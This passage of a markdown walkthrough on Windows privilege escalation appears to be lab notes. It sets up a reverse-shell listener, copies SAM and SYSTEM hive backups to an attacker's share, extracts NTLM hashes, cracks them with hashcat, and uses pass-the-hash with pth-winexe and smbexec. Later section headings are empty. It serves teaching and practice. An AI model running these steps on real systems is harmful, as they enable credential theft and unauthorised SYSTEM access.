     - **`C:\PrivEsc\reverse.exe`** : This is your payload (reverse shell).
     
     
     > ---
     > ### 📌 _Goal → Run reverse.exe with admin privileges without entering the password yourself → take a shell with higher privileges._
     > ---
     
     
     ## 3. open listener on kali
     
     ```ruby
     nc -nvlp 4444
     ```
     
     
     
     <img width="1265" height="315" alt="image" src="https://github.com/user-attachments/assets/f1595237-ce9c-4b71-baa1-383a14ee2106" />
     
     



  </details>









- <details>
     <summary>Security Account Manager (SAM)</summary>

     > ``The idea of ​​exploitation``
     > Windows stores user password hashes in a file called ``SAM`` (Security Account Manager).
     > But the SAM is encrypted, and the key to decrypt it is stored in the ``SYSTEM`` file.
     
     
     > ---
     > ### 📌 _The idea → If you find a backup copy of these files (such as ``C:\Windows\Repair\``), you can copy them and break the passwords._
     > ---
     
     
     ## 1. Transfer SAM and SYSTEM files to Kali
     
     ```ruby
     copy C:\Windows\Repair\SAM \\10.8.47.102\kali\
     copy C:\Windows\Repair\SYSTEM \\10.8.47.102\kali\
     ```
     
     <img width="1247" height="371" alt="image" src="https://github.com/user-attachments/assets/9312c3bf-1ef6-413d-94ba-b0a3dc5dda61" />
     
     
     
     
     > ---
     > ### 📌 _Goal → We take the hashes files and bring them to us so that we can work on them at our convenience._
     > ---
     
     
     ## 2. Download ``creddump7`` Tool
     
     
     ```ruby
     git clone https://github.com/Tib3rius/creddump7
     
     sudo mv creddump7 /opt/
     sudo ln -s /opt/creddump7/pwdump.py /usr/local/bin/pwdump
     ```
     
     > Install the encryption library
     
     ```python
     pip3 install pycrypto
     ```
     
     - **`pip3`** : Python3 package manager.
     - **`install pycrypto`** : We install the `PyCrypto library`so that the tool can extract hashes form files.
     
     
     ## 3. Extracting hashes from files
     
     
     ```ruby
     pwdump SYSTEM SAM
     ```
     
     <img width="883" height="224" alt="image" src="https://github.com/user-attachments/assets/d6c3d6c5-1652-4ed7-b50a-a351130eee05" />
     
     ```ruby
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
     user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
     admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
     ```
     
     
     >  ```
     >  Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
     >  ```
     
     - **`Administrator`** : username
     - **`500`** : The user's RID (Relative Identifier). 500 usually remains the primary Administrator.
     - **`aad3b435b51404eeaad3b435b51404ee`** : LM hash (if not used, this is the default placeholder).
     - **`fc525c9683e8fe067095ba2ddc971889`** : NT hash (which we can use to crack the password or pass-the-hash).
     - **`:::`** : Additional fields are not important to us now.
     
     
     
     ## 4. Crack the hash using Hashcat
     
     
     ```ruby
     hashcat -m 1000 -a 0 fc525c9683e8fe067095ba2ddc971889 /usr/share/wordlists/rockyou.txt
     ```
     
     - **`hashcat`** : A powerful tool for cracking passwords.
     - **`-m 1000`** : It means the hash is of type NTLM.
     
     <img width="672" height="166" alt="image" src="https://github.com/user-attachments/assets/05e7ca96-024b-4d9d-91c0-3010dcc1bd54" />
     
     
     
     
     ## 5. Exploiting the password after it is broken
     
     
     ```ruby
     winexe -U 'admin%<password>' //10.10.10.10 cmd.exe
     
     Or
     
     rdesktop -u admin -p <password> 10.10.10.10
     ```
     
     
     
     <img width="681" height="378" alt="image" src="https://github.com/user-attachments/assets/b422fc9e-d7f2-4542-bc24-59d137851956" />
     
     
     


  </details>









- <details>
     <summary> Passing the Hash</summary>
     
     > ---
     > ### 📌 _The idea → Usually in attacks on Windows, when you have a hash instead of cracking the password, you can use a technique called Pass-the-Hash (PTH).
     > Idea: The hash is used directly for authentication instead of the actual password.
     
     > Why is this useful?
     
     > - Save time (you don't need to break the password).
     
     > - Some systems may prevent brute-force, but not the use of hash for authentication._
     > ---
     
     
     ```ruby
     pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.148.63 cmd.exe
     ```
     
     or 
     
     ```ruby
     python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da admin@10.10.148.63
     ```
     
     
     <img width="1090" height="261" alt="image" src="https://github.com/user-attachments/assets/d017160b-c081-4946-a00b-5ac68d94c122" />
     
     
     <img width="1099" height="245" alt="image" src="https://github.com/user-attachments/assets/004a30ec-a449-4e55-b8a4-b7bb52ccbe7d" />
     
     
     > `smbexec.py` uses the creation service on Windows to run the shell.
     
     > Any service that runs on Windows usually runs under `SYSTEM` privileges.
     
     > This means that even if the user you specified is admin, the `shell` that will open will be `SYSTEM` because it is the service on Windows that is running.
     
     > This is a great advantage because it gives you the highest powers over the system.
     
     
     
     | tool                  | Privileges         | method                                             |
     | --------------------- | ------------------ | -------------------------------------------------- |
     | `impacket smbexec.py` | SYSTEM             | You create a service and run a shell inside it     |
     | `pth-winexe`          | Admin              | Regular logon and shell execution in user session  |
     
     
     


  </details>








     
</details>






















<details>
  <summary>Scheduled Tasks</summary>
</details>

<details>
  <summary>Insecure GUI Apps</summary>
</details>

<details>
  <summary>Startup Apps</summary>
</details>

<details>
  <summary>Token Impersonation</summary>





- <details>
      <summary>Rogue Potato</summary>
  </details>


- <details>
      <summary>PrintSpoofer</summary>
  </details>





     
</details>

<details>
  <summary>Privilege Escalation Scripts</summary>
</details>





